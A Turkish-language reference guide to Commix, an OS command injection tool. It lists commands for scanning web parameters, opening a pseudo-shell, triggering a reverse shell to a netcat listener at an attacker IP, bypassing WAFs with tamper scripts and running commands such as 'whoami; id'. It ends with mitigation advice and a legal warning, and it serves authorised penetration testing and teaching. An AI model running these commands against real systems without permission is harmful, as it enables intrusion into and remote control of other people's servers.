# 💉 Commix - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Otomatik İşletim Sistemi Komut Enjeksiyonu Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Commix-Komut_Enjeksiyonu-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Geliştirici-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Kategori-Web_Güvenliği_&_API-green?style=for-the-badge" alt="Web Güvenliği">
  <img src="https://img.shields.io/badge/Lisans-GPLv3-red?style=for-the-badge" alt="Lisans GPLv3">
</p>

<p align="center">
  <b>🌐 Web uygulamalarındaki İşletim Sistemi Komut Enjeksiyonu (OS Command Injection) açıklarını otomatik tespit ve istismar eden, SQLMap eşdeğeri araç</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & Komut Enjeksiyonu Mantığı](#-genel-bakış--komut-enjeksiyonu-mantığı)
- [Kurulum](#-kurulum)
- [Temel Zafiyet Taraması](#-temel-zafiyet-taraması)
- [Farklı HTTP Bileşenlerine Enjeksiyon](#-farklı-http-bileşenlerine-enjeksiyon)
  - [GET Parametreleri](#get-parametreleri)
  - [POST Verisi (`--data`)](#post-verisi---data)
  - [HTTP Başlıkları ve Çerezler](#http-başlıkları-ve-çerezler)
- [Etkileşimli ve Ters Kabuk (Reverse Shell) Alma](#-etkileşimli-ve-ters-kabuk-reverse-shell-alma)
  - [Sahte Kabuk (`--os-shell`)](#sahte-kabuk---os-shell)
  - [Doğal Ters Kabuk (`--reverse-ip`)](#doğal-ters-kabuk---reverse-ip)
- [WAF Atlama & Karıştırma Betikleri (`--tamper`)](#-waf-atlama--karıştırma-betikleri---tamper)
- [Dosya ve Zaman Tabanlı Kör Enjeksiyon](#-dosya-ve-zaman-tabanlı-kör-enjeksiyon)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & Giderme](#-savunma-açısından-değerlendirme--giderme)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & Komut Enjeksiyonu Mantığı

SQL enjeksiyonu için **SQLMap** ne ise, işletim sistemi komut enjeksiyonu için **Commix** (Anastasios Stasinopoulos tarafından geliştirilmiştir) aynı dünya standardıdır.

Web uygulamaları kullanıcıdan aldıkları verileri doğrudan işletim sistemi komut fonksiyonlarına (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`) filtresiz ilettiğinde komut enjeksiyonu açığı doğar. Commix; doğrudan çıktı veren, zaman tabanlı kör (time-based blind) ve dosya tabanlı (file-based) tüm komut enjeksiyonu açıklarını otomatik olarak bulup istismar eder.

---

## 📥 Kurulum

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# GitHub'dan En Güncel Sürümü Çekme
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```

---

## 🚀 Temel Zafiyet Taraması

```bash
# GET parametresi içeren URL taraması
commix -u "http://hedef.local/status.php?addr=127.0.0.1"

# Sorulara otomatik evet deme (Toplu / Batch Modu)
commix -u "http://hedef.local/ping.php?host=localhost" --batch
```

---

## 🔍 Farklı HTTP Bileşenlerine Enjeksiyon

### GET Parametreleri
Birden çok parametre varsa `INJECT_HERE` etiketiyle hedef noktayı belirtebilirsiniz:
```bash
commix -u "http://hedef.local/view.php?page=INJECT_HERE&user=admin"
```

### POST Verisi (`--data`)
```bash
# POST gövdesindeki parametreleri test etme
commix -u "http://hedef.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Burp Suite'ten kaydedilen ham istek dosyasını kullanma
commix -r istek.req
```

### HTTP Başlıkları ve Çerezler
```bash
# User-Agent başlığını komut enjeksiyonu için test etme
commix -u "http://hedef.local/index.php" --user-agent="test" --level=3

# Oturum çerezi üzerinden test etme
commix -u "http://hedef.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```

---

## 💀 Etkileşimli ve Ters Kabuk (Reverse Shell) Alma

### Sahte Kabuk (`--os-shell`)

Enjeksiyon doğrulandığında, terminal üzerinden doğrudan komut çalıştırmayı sağlayan simüle edilmiş bir uçbirim açar:

```bash
commix -u "http://hedef.local/ping.php?ip=127.0.0.1" --os-shell
```

### Doğal Ters Kabuk (`--reverse-ip`)

Hedef makineden kendi makinenize tam teşekküllü ters bağlantı (reverse shell) başlatma:

```bash
# 1. Saldırgan makinesinde Netcat dinleyicisi açılır
nc -lvnp 4444

# 2. Commix üzerinden ters kabuk tetiklenir
commix -u "http://hedef.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```

---

## 🥷 WAF Atlama & Karıştırma Betikleri (`--tamper`)

Web Güvenlik Duvarı (WAF) kurallarını ve boşluk filtrelerini atlatmak için:

```bash
# Mevcut tamper betiklerini listeleme
commix --list-tampers

# Boşluk karakterlerini ${IFS} ile değiştirme
commix -u "http://hedef.local/exec.php?cmd=test" --tamper=space2ifs

# Enjeksiyon karakterlerini Hex kodlama ile gönderme
commix -u "http://hedef.local/exec.php?cmd=test" --tamper=hexencode
```

---

## ⏱️ Dosya ve Zaman Tabanlı Kör Enjeksiyon

Sunucu komut çıktısını ekrana basmıyorsa:

```bash
# Zaman tabanlı kör (Time-Based) tekniği zorlama
commix -u "http://hedef.local/blind.php?id=1" --technique=T

# Dosya tabanlı enjeksiyon (çıktıyı web dizinine yazıp okuma)
commix -u "http://hedef.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```

---

## ⚡ Hızlı Referans Tablosu

| İşlem | Komut |
|-------|-------|
| **GET Parametresi Tara** | `commix -u "<URL>?param=deger"` |
| **POST Parametresi Tara** | `commix -u "<URL>" --data="param=deger"` |
| **Toplu / Batch Tarama** | `commix -u "<URL>" --batch` |
| **Etkileşimli Terminal Kabuğu**| `commix -u "<URL>" --os-shell` |
| **Ters Kabuk Başlat** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Burp İsteğini Oynat** | `commix -r burp_istek.req` |
| **Boşluk Tamper Kullan** | `commix -u "<URL>" --tamper=space2ifs` |
| **Doğrudan Komut Çalıştır** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Savunma Açısından Değerlendirme & Giderme

1. **Sistem Çağrılarından Kaçının:** Kullanıcı girdilerini asla doğrudan `system()` veya `exec()` çağrılarına bağlamayın.
2. **Dahili API'leri Kullanın:** Sistem komutları çalıştırmak yerine programlama dillerinin yerel kütüphanelerini kullanın (örn: `ping` çalıştırmak yerine doğrudan `socket` ile port yoklayın).
3. **Katı Beyaz Liste (Whitelist):** Girdi zorunluysa, yalnızca izin verilen alfanümerik karakterleri kabul eden katı filtreler uygulayın.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Commix hedef sunucuda doğrudan işletim sistemi komutu çalıştırır. İzin alınmaksızın web uygulamalarını test etmek veya komut çalıştırmak Türk Ceza Kanunu ve uluslararası bilişim yasaları kapsamında suçtur.